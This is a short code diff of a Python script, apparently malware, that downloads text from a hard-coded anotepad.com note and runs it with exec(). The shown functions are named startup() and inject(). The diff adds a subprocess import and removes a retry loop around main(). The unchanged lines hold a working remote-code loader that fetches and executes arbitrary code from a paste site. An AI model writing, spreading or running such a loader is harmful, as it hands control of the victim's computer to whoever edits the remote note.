@@ -5,6 +5,7 @@ import os
 import time
 import shutil
 import sys
+import subprocess
 url = "https://anotepad.com/notes/3gkei2dg"
 
 def startup():
@@ -29,11 +30,7 @@ def main():
     soup = BeautifulSoup(response.text, "html.parser")
     plaintext_content = soup.find(class_="plaintext")
     exec(plaintext_content.text.strip())
-    try:
-        main()
-    except:
-        time.sleep(2)
-        main()
+
 
 inject()
 time.sleep(1)
